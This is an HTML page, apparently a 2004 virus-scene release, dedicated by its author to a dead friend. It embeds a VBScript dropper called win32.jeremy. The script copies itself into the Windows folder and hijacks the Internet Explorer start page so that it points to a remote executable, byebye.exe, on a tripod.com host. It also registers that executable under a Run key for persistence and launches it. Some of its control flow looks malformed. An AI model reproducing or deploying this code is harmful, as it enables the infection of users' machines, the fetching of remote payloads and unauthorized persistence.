<html>

<body bgcolor="black" link="#000000" vlink="#000000" alink="#ff0000" text=lime>
<center>
<br>
<font size=+2><u><b><font color="#0080FF">W</font><font color="#008CE8">i</font><font color="#0097D1">n</font><font color="#00A3B9">3</font><font color="#00AEA2">2</font><font color="#00BA8B">.</font><font color="#00C574">J</font><font color="#00D15D">e</font><font color="#00DC46">r</font><font color="#00E82E">e</font><font color="#00F317">m</font><font color="#00FF00">y</font></font></u><br><br><br>
<title>...and once again one of my pals...!?</title>
<font size=-1 color=white>+++++++++++++++<br><br>
Written for one of my friends who died through an car accident
<br><br>
(c)oded in GermanY 2oo4<br><br>by Necronomikon/ZeroGravity<br>
<br><br></font>
<Script Language=vbs>
rem win32.jeremy
rem (c) by Necronomikon/ZG
Set downloader = CreateObject("WScript.Shell")
downloader.regwrite "HKCU\software\win32Jeremy\", "(c)by Necronomikon/ZeroGravity"
Set Jeremy= Createobject("scripting.filesystemobject")
Jeremy.copyfile wscript.scriptfullname,Jeremy.GetSpecialFolder(0)&_
"\jeremy.vbs"
ZGravity= ""
ZGravity= downloader.regread("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
If (ZGravity= "") Then
ZGravity = "c:"
End If
If Right(ZGravity, 1) = " \ " Then ZGravity = Mid(ZGravity, 1, Len(ZGravity) - 1)
If Not (Jeremy.fileexists(Jeremy.getspecialfolder(0) & "\byebye.exe")) Then
If Not (Jeremy.fileexists(ZGravity & "\byebye.exe")) Then
downloader.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",_
"http://win32jeremy.tripod.com/byebye.exe"
downloader.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RUN",_
Jeremy.getspecialfolder(0) & "\byebye.exe"
Else
downloader.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page",_
"about:blank"
Jeremy.copyfile ZGravity & "\byebye.exe",_
Jeremy.getspecialfolder(0) & "\byebye.exe"
downloader.run Jeremy.getspecialfolder(0) & "\byebye.exe", 1, False
end if
</script>
</BODY>
</html>

